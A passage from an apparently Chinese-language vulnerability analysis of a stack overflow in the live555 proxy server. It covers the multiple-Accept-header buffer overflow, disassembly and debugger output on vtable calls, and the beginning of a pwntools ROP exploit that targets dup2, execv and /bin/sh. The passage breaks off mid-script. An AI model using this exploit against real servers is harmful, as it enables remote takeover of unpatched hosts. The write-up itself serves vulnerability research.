.text:0000000000407F84                 movsxd  rax, r13d
.text:0000000000407F87                 cmp     rbp, r11
.text:0000000000407F8A                 mov     <span class="o">[</span>rsp+6D8h+newBytesRead], rax
.text:0000000000407F8F                 lea     rax, <span class="o">[</span>ptr+rax-1]
.text:0000000000407F94                 cmovnb  r11, rbp
</code></pre></div></div>

<p>acceptStr以参数透传的方式传递给漏洞lookForHeader：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Boolean</span> <span class="n">RTSPServer</span><span class="o">::</span><span class="n">RTSPClientConnection</span><span class="o">::</span><span class="n">parseHTTPRequestString</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">resultCmdName</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultCmdNameMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">urlSuffix</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">urlSuffixMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">sessionCookieMaxSize</span><span class="p">,</span>
								 <span class="kt">char</span><span class="o">*</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">acceptStrMaxSize</span><span class="p">)</span> <span class="p">{</span>
								 
  <span class="p">......</span>
  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"x-sessioncookie"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">sessionCookie</span><span class="p">,</span> <span class="n">sessionCookieMaxSize</span><span class="p">);</span>
  <span class="n">lookForHeader</span><span class="p">(</span><span class="s">"Accept"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">reqStr</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">reqStrSize</span><span class="o">-</span><span class="n">i</span><span class="p">,</span> <span class="n">acceptStr</span><span class="p">,</span> <span class="n">acceptStrMaxSize</span><span class="p">);</span>
  
  <span class="k">return</span> <span class="n">True</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>漏洞的原因在于攻击者可以在一次http请求中构造多个accept字段，这多个accept字段都会被拷贝到acceptStr[200]数组中，而lookForHeader函数仅对单次拷贝Accept的长度做了限制不超过200：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">lookForHeader</span><span class="p">(</span><span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">headerName</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">source</span><span class="p">,</span> 
						<span class="kt">unsigned</span> <span class="n">sourceLen</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">resultStr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">resultStr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="n">headerNameLen</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">headerName</span><span class="p">);</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">sourceLen</span><span class="o">-</span><span class="n">headerNameLen</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
	  <span class="c1">//循环解析"Accept:"字符串，可以解析多个Accept字段</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">headerName</span><span class="p">,</span> <span class="n">headerNameLen</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="n">headerNameLen</span><span class="p">]</span> <span class="o">==</span> <span class="sc">':'</span><span class="p">)</span> 
    <span class="p">{</span>
      <span class="c1">//找到了accept头.  跳过空白和制表符</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">+=</span> <span class="n">headerNameLen</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">sourceLen</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">' '</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\t'</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{}</span>
      <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">j</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">sourceLen</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span><span class="p">)</span> <span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\r'</span> <span class="o">||</span> <span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'\n'</span><span class="p">)</span> <span class="p">{</span>
			  <span class="c1">// 字符串拷贝</span>
				  <span class="k">if</span> <span class="p">(</span><span class="n">j</span><span class="o">-</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;</span> <span class="n">resultMaxSize</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>  <span class="c1">//resultMaxSize限制为200, 但这个仅仅是针对单次</span>
																						 <span class="c1">//的复制过程，如果控制每个Accept字段长度不超过200</span>
																						 <span class="c1">//那么就可以反复拷贝造成溢出</span>
				  <span class="c1">// 标记源字符串中的拷贝起始位置</span>
				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSource</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
				  <span class="c1">// 标记源字符串中的拷贝结束位置</span>
				  <span class="kt">char</span> <span class="k">const</span><span class="o">*</span> <span class="n">resultSourceEnd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">source</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
				  <span class="c1">// 位于下标 i,j之间的内容拷贝到acceptStr数组中</span>
				  <span class="k">while</span> <span class="p">(</span><span class="n">resultSource</span> <span class="o">&lt;</span> <span class="n">resultSourceEnd</span><span class="p">)</span> <span class="o">*</span><span class="n">resultStr</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">resultSource</span><span class="o">++</span><span class="p">;</span> <span class="c1">//漏洞点</span>
				  <span class="o">*</span><span class="n">resultStr</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
				  <span class="k">break</span><span class="p">;</span>
				<span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>漏洞的效果是覆盖handleRequestBytes函数到incomingRequestHandle的返回地址。</p>

<h2 id="c虚表函数调用">C++虚表函数调用</h2>

<p>以doEventLoop函数的调用为例，该函数是TaskScheduler对象的方法，而 UsageEnvironment对象又包含了一个TaskScheduler对象：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  
  <span class="n">TaskScheduler</span><span class="o">*</span> <span class="n">scheduler</span> <span class="o">=</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">createNew</span><span class="p">();</span>
  <span class="n">UsageEnvironment</span><span class="o">*</span> <span class="n">env</span> <span class="o">=</span> <span class="n">BasicUsageEnvironment</span><span class="o">::</span><span class="n">createNew</span><span class="p">(</span><span class="o">*</span><span class="n">scheduler</span><span class="p">);</span>
  <span class="p">......</span>
  <span class="n">env</span><span class="o">-&gt;</span><span class="n">taskScheduler</span><span class="p">().</span><span class="n">doEventLoop</span><span class="p">();</span> <span class="c1">// does not return</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">class</span> <span class="n">TaskScheduler</span> <span class="p">{</span>
	<span class="nl">public:</span>
	  <span class="k">virtual</span> <span class="o">~</span><span class="n">TaskScheduler</span><span class="p">();</span>  <span class="c1">// 析构函数</span>
	  <span class="p">......</span>
	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span> <span class="n">oldSocketNum</span><span class="p">,</span> <span class="kt">int</span> <span class="n">newSocketNum</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	  <span class="k">virtual</span> <span class="kt">void</span> <span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span> <span class="n">watchVariable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="nl">protected:</span>
	  <span class="n">TaskScheduler</span><span class="p">();</span> <span class="c1">// 构造函数</span>
<span class="p">};</span>

<span class="n">class</span> <span class="n">UsageEnvironment</span> <span class="p">{</span>
	<span class="nl">public:</span>
	  <span class="n">Boolean</span> <span class="n">reclaim</span><span class="p">();</span>
	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">taskScheduler</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span><span class="k">return</span> <span class="n">fScheduler</span><span class="p">;}</span>
	<span class="p">......</span>

	<span class="nl">protected:</span>
	  <span class="n">UsageEnvironment</span><span class="p">(</span><span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">scheduler</span><span class="p">);</span> <span class="c1">// 构造函数</span>
	  <span class="k">virtual</span> <span class="o">~</span><span class="n">UsageEnvironment</span><span class="p">();</span> <span class="c1">// 析构函数</span>

	<span class="nl">private:</span>
	  <span class="n">TaskScheduler</span><span class="o">&amp;</span> <span class="n">fScheduler</span><span class="p">;</span>   <span class="c1">// 包含了一个TaskScheduler对象,保存的是指针</span>
<span class="p">};</span>
     
</code></pre></div></div>

<p>从反汇编的角度来看env-&gt;taskScheduler().doEventLoop()调用过程：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text:00000000004052DF loc_4052DF:                             <span class="p">;</span> CODE XREF: main+5D5↓j
.text:00000000004052DF    mov   rax, cs:env    <span class="p">;</span> 解引用env对象
.text:00000000004052E6    xor   esi, esi       <span class="p">;</span> <span class="nb">env</span>+0x18的位置保存TaskScheduler对象指针
.text:00000000004052E8    mov   rdi, <span class="o">[</span>rax+18h] <span class="p">;</span> fScheduler对象地址作为第一个参数, this
.text:00000000004052EC    mov   rax, <span class="o">[</span>rdi]     <span class="p">;</span> 对象的第一个8字节保存的函数虚表地址
.text:00000000004052EF    call  qword ptr <span class="o">[</span>rax+38h] <span class="p">;</span> 虚表中index为7的槽位是doEventLoop函数指针
</code></pre></div></div>

<p>这段代码对应的F5：</p>

<p>可以看到this就是对象本身的指针，this默认作为方法的第一个参数传递给rdi寄存器，方法定义中的其他参数往后顺延。</p>

<p><img src="/assets/posts/2025-04-15-live555栈溢出漏洞分析/%E6%89%B9%E6%B3%A8_2025-04-15_171433.png" alt="批注 2025-04-15 171433.png" /></p>

<p>观察数据结构可以看到UsageEnvironment对象和TaskScheduler对象的第0个字节都是虚表指针。</p>

<p>UsageEnvironment对象偏移0x18字节的位置保存了TaskScheduler对象的指针。</p>

<p>每一次对象方法的调用都是以对象的地址作为this指针，传递给rdi寄存器，作为对象方法的第一个参数。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 UsageEnvironment struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x20, <span class="nv">align</span><span class="o">=</span>0x8, copyof_37<span class="o">)</span>
00000000                                         <span class="p">;</span> XREF: BasicUsageEnvironment0/r
00000000 _vptr_UsageEnvironment dq ?             <span class="p">;</span> offset
00000008 liveMediaPriv   dq ?                    <span class="p">;</span> offset
00000010 groupsockPriv   dq ?                    <span class="p">;</span> offset
00000018 fScheduler      dq ?                    <span class="p">;</span> offset
00000020 UsageEnvironment ends
00000020
00000000 <span class="p">;</span> <span class="nt">---------------------------------------------------------------------------</span>
00000000
00000000 TaskScheduler   struc <span class="p">;</span> <span class="o">(</span><span class="nv">sizeof</span><span class="o">=</span>0x8, <span class="nv">align</span><span class="o">=</span>0x8, copyof_44<span class="o">)</span>
00000000 _vptr_TaskScheduler dq ?                <span class="p">;</span> offset
00000008 TaskScheduler   ends
00000008
</code></pre></div></div>

<p>函数虚表是被硬编码在可执行文件中的，其中包含了对象的类型信息和函数指针表。</p>

<p>函数指针表的位置是从0x46AA08开始，该地址保存在对象中，作为方法调用时候的索引基地址，也就是每个对象开头的8个字节：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="p">;</span> <span class="err">`</span><span class="n">vtable</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">A9F8</span> <span class="n">_ZTV18BasicTaskScheduler</span> <span class="n">dq</span> <span class="mi">0</span>           <span class="p">;</span> <span class="n">offset</span> <span class="n">to</span> <span class="n">this</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA00</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZTI18BasicTaskScheduler</span> <span class="p">;</span> <span class="err">`</span><span class="n">typeinfo</span> <span class="k">for</span><span class="err">'</span><span class="n">BasicTaskScheduler</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span> <span class="n">off_46AA08</span>      <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD2Ev</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span><span class="o">+</span><span class="mi">4</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA08</span>                                         <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA10</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskSchedulerD0Ev</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::~</span><span class="n">BasicTaskScheduler</span><span class="p">()</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA18</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler019scheduleDelayedTaskElPFvPvES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">scheduleDelayedTask</span><span class="p">(</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA20</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler021unscheduleDelayedTaskERPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">unscheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA28</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN13TaskScheduler21rescheduleDelayedTaskERPvlPFvS0_ES0_</span> <span class="p">;</span> <span class="n">TaskScheduler</span><span class="o">::</span><span class="n">rescheduleDelayedTask</span><span class="p">(</span><span class="kt">void</span> <span class="o">*&amp;</span><span class="p">,</span><span class="kt">long</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA30</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler21setBackgroundHandlingEiiPFvPviES0_</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">setBackgroundHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">,</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span><span class="kt">int</span><span class="p">),</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA38</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler18moveSocketHandlingEii</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">moveSocketHandling</span><span class="p">(</span><span class="kt">int</span><span class="p">,</span><span class="kt">int</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA40</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler011doEventLoopEPVc</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">doEventLoop</span><span class="p">(</span><span class="kt">char</span> <span class="k">volatile</span><span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA48</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018createEventTriggerEPFvPvE</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">createEventTrigger</span><span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA50</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler018deleteEventTriggerEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">deleteEventTrigger</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA58</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN19BasicTaskScheduler012triggerEventEjPv</span> <span class="p">;</span> <span class="n">BasicTaskScheduler0</span><span class="o">::</span><span class="n">triggerEvent</span><span class="p">(</span><span class="n">uint</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA60</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN16UsageEnvironment13internalErrorEv</span> <span class="p">;</span> <span class="n">UsageEnvironment</span><span class="o">::</span><span class="n">internalError</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">rel</span><span class="p">.</span><span class="n">ro</span><span class="o">:</span><span class="mo">000000000046</span><span class="n">AA68</span>                 <span class="n">dq</span> <span class="n">offset</span> <span class="n">_ZN18BasicTaskScheduler10SingleStepEj</span> <span class="p">;</span> <span class="n">BasicTaskScheduler</span><span class="o">::</span><span class="n">SingleStep</span><span class="p">(</span><span class="n">uint</span><span class="p">)</span>
</code></pre></div></div>

<p>通过调试进一步验证了上述猜想，TaskScheduler对象的地址为0x158fdeb0，该地址位于堆，说明对象是动态分配在堆上面的。</p>

<p>对象的第一个8字节是指向虚表中的函数指针表的指针，值为0x46aa08，与反汇编结果一致。</p>

<p>函数指针表中偏移0x38的位置就是doEventLoop函数的地址，与反汇编结果一致。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──────────────────────────────[ BACKTRACE <span class="o">]</span>────────────────────────────────────
 ► 0         0x441bc0 BasicTaskScheduler0::doEventLoop<span class="o">(</span>char volatile<span class="k">*</span><span class="o">)</span>
   1         0x4052f2 main+1218
   2              0x0 None
───────────────────────────────────────────────────────────────────────────────
<span class="c">#0  BasicTaskScheduler0::doEventLoop (this=0x158fdeb0, watchVariable=0x0) at BasicTaskScheduler0.cpp:76</span>
<span class="c">#1  0x00000000004052f2 in main (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at live555ProxyServer.cpp:263</span>
<span class="c">#2  0x0000000000000000 in ?? ()</span>
pwndbg&gt; x/16xw this                 // 观察TaskScheduler对象, 0x46aa08指向虚表
0x158fdeb0:     0x0046aa08      0x00000000      0x00464ba8      0x00000000
0x158fdec0:     0x15904050      0x00000000      0x15904000      0x00000000
0x158fded0:     0x7fffffca      0x00000000      0x0001789a      0x00000000
0x158fdee0:     0x00000001      0x00000000      0x67fe29e2      0x00000000
pwndbg&gt; x/32xg 0x0046aa08           // 观察虚表, 里面都是函数指针
0x46aa08 &lt;_ZTV18BasicTaskScheduler+16&gt;: 0x000000000043fec0      0x000000000043fee0
0x46aa18 &lt;_ZTV18BasicTaskScheduler+32&gt;: 0x0000000000441dc0      0x0000000000441e60
0x46aa28 &lt;_ZTV18BasicTaskScheduler+48&gt;: 0x0000000000442300      0x000000000043ff10
0x46aa38 &lt;_ZTV18BasicTaskScheduler+64&gt;: 0x0000000000440050      0x0000000000441bc0
0x46aa48 &lt;_ZTV18BasicTaskScheduler+80&gt;: 0x0000000000441c00      0x0000000000441ea0
0x46aa58 &lt;_ZTV18BasicTaskScheduler+96&gt;: 0x0000000000441c70      0x0000000000404e22
0x46aa68 &lt;_ZTV18BasicTaskScheduler+112&gt;:        0x00000000004402d0      0x00007f89e8a85008
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<p>首先开启服务端程序，live555会在本机8000端口监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./live555ProxyServer rtsp://127.0.0.1
LIVE555 Proxy Server
        <span class="o">(</span>LIVE555 Streaming Media library version 2018.08.28<span class="p">;</span> licensed under the GNU LGPL<span class="o">)</span>

Created new TCP socket 4 <span class="k">for </span>connection
RTSP stream, proxying the stream <span class="s2">"rtsp://127.0.0.1"</span>
        Play this stream using the URL: rtsp://192.168.141.128:8554/proxyStream

<span class="o">(</span>We use port 8000 <span class="k">for </span>optional RTSP-over-HTTP tunneling.<span class="o">)</span>
Created new TCP socket 4 <span class="k">for </span>connection
Created new TCP socket 4 <span class="k">for </span>connection
</code></pre></div></div>

<p>漏洞利用代码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python 
</span>
<span class="c1"># ./exp.py 127.0.0.1 8000
</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x405301</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x406277</span>
<span class="n">pop_rdx_rbx_ret</span> <span class="o">=</span> <span class="mh">0x424b50</span>
<span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="mh">0x415bb5</span>
<span class="n">re_enter</span> <span class="o">=</span> <span class="mh">0x4052DF</span>
<span class="n">send_plt</span> <span class="o">=</span> <span class="mh">0x403560</span>   <span class="c1"># ssize_t send(int sockfd, const void *buf, size_t len, int flags);
</span><span class="n">strncmp_got</span> <span class="o">=</span> <span class="mh">0x46B080</span>
<span class="n">dup2_off</span> <span class="o">=</span> <span class="mh">0x10EAE0</span>
<span class="n">execv_off</span> <span class="o">=</span> <span class="mh">0xE32D0</span>
<span class="n">sh_off</span> <span class="o">=</span> <span class="mh">0x1B45BD</span>
<span class="n">offset</span> <span class="o">=</span> <span class="mh">0x184230</span>

<span class="k">def</span> <span class="nf">genHeader</span><span class="p">(</span><span class="n">raw</span><span class="p">):</span>
    <span class="n">header</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
GET / HTTP/1.1</span><span class="se">\r\n</span><span class="s">
Host: 127.0.0.1:8000</span><span class="se">\r\n</span><span class="s">
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><span class="se">\r\n</span><span class="s">
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><span class="se">\r\n</span><span class="s">
Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">
Connection: keep-alive</span><span class="se">\r\n</span><span class="s">
Upgrade-Insecure-Requests: 1</span><span class="se">\r\n</span><span class="s">
</span><span class="sh">'''</span>
    <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">Accept:</span><span class="sh">"</span>
    <span class="n">header</span> <span class="o">=</span> <span class="n">header</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
    <span class="n">chunks</span> <span class="o">=</span> <span class="p">[</span><span class="n">raw</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">50</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">raw</span><span class="p">),</span> <span class="mi">50</span><span class="p">)]</span>
    <span class="k">if</span> <span class="n">chunks</span><span class="p">:</span>
        <span class="n">header</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\r\n</span><span class="s">Accept:</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">().</span><span class="nf">join</span><span class="p">(</span><span class="n">chunks</span><span class="p">)</span>  <span class="c1"># Join chunks with delimiter
</span>    
    <span class="c1"># End the header
